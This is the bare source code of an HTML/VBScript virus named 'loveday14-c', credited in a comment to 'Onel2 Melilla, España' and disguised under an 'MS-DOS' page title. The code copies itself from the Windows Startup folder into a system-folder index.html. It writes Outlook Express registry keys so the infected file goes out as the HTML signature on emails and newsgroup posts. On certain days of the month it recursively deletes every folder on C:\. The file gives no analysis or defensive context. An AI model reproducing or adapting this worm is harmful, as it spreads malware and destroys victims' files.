<HTML>
<TITLE>MS-DOS</TITLE><BODY BGCOLOR=#000000></BODY>
<SCRIPT LANGUAGE="VBScript">
On Error Resume Next
Dim fso, rd, ht, wsh, ds, idf, f1, sf
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsh = CreateObject("WScript.Shell")
Set ds = fso.GetSpecialFolder(1)
If not(fso.FileExists(ds & "\index.html")) Then
Set ht = fso.CreateTextFile(ds & "\index.html")
If navigator.systemLanguage = "es" Then
Set rd = fso.OpenTextFile("c:\WINDOWS\Menú Inicio\Programas\Inicio\loveday14-c.hta",1)
Else
Set rd = fso.OpenTextFile("c:\WINDOWS\Start Menu\Programs\Startup\loveday14-c.hta",1)
end If
Do While rd.Read(1) <> "9"
Loop
a = rd.Read(3135)
a = Replace(a, chr(34), chr(34) & chr(34))
ht.WriteLine "<HTML><BODY>"
ht.WriteLine "<SCRIPT LANGUAGE=""VBScript""><!--"
ht.WriteLine "Rem loveday14-c by Onel2 Melilla, España"
ht.WriteLine "'Esto es lo mismo que loveday-a, solo que ahora puede afectar a los grupos de noticias"
ht.WriteLine "On Error Resume Next"
ht.WriteLine "Dim stl"
ht.WriteLine "Set stl = CreateObject(""Scriptlet.TypeLib"")"
ht.WriteLine "If navigator.systemLanguage = ""es"" Then"
ht.WriteLine "stl.Path = ""c:\WINDOWS\Menú Inicio\Programas\Inicio\loveday14-c.hta"""
ht.WriteLine "Else"
ht.WriteLine "stl.Path = ""c:\WINDOWS\Start Menu\Programs\Startup\loveday14-c.hta"""
ht.WriteLine "end If"
ht.WriteLine "stl.Doc = ""<HTML>""&vbcrlf&_"
ht.WriteLine """<TITLE>MS-DOS</TITLE><BODY BGCOLOR=#000000></BODY>""&vbcrlf&_"
ht.WriteLine chr(34) & "9" & a & "</" & chr(34) & "&" & chr(34) & "SCRIPT></" & "HTML>" & chr(34)
ht.WriteLine "stl.Write"
ht.WriteLine "--></" & "SCRIPT></BODY></HTML>"
ht.Close
end If
Set idf = fso.GetFolder("c:\WINDOWS\Application Data\Identities")
Set sf = idf.SubFolders
For Each f1 In sf
wsh.RegWrite "HKCU\Identities\" & f1.name & "\Software\Microsoft\Outlook Express\5.0\signatures\Default Signature","00000000"
wsh.RegWrite "HKCU\Identities\" & f1.name & "\Software\Microsoft\Outlook Express\5.0\signatures\00000000\file",ds & "\index.html"
wsh.RegWrite "HKCU\Identities\" & f1.name & "\Software\Microsoft\Outlook Express\5.0\signatures\00000000\text",""
wsh.RegWrite "HKCU\Identities\" & f1.name & "\Software\Microsoft\Outlook Express\5.0\signatures\00000000\type",2,"REG_DWORD"
wsh.RegWrite "HKCU\Identities\" & f1.name & "\Software\Microsoft\Outlook Express\5.0\signatures\00000000\name","Firma 1"
wsh.RegWrite "HKCU\Identities\" & f1.name & "\Software\Microsoft\Outlook Express\5.0\Signature Flags",3,"REG_DWORD"
wsh.RegWRite "HKCU\Identities\" & f1.name & "\Software\Microsoft\Outlook Express\5.0\News\Message Send HTML",2,"REG_DWORD"
Next
If Day(now) = 8 Or Day(now) = 14 Or Day(now) = 19 Or Day(now) = 29 Or Day(now) = 28 then
lovefolders("c:\")
end If
Sub lovefolders(folderspec)
On Error Resume Next
Dim f, f2, fc
Set f = fso.GetFolder(folderspec)
Set fc = f.SubFolders
For Each f2 In fc
lovefolders(f2.Path)
fso.CreateFolder(f2.Path & "happysanvalentin")
fso.DeleteFolder(f2.Path)
Next
end Sub
</SCRIPT></HTML>
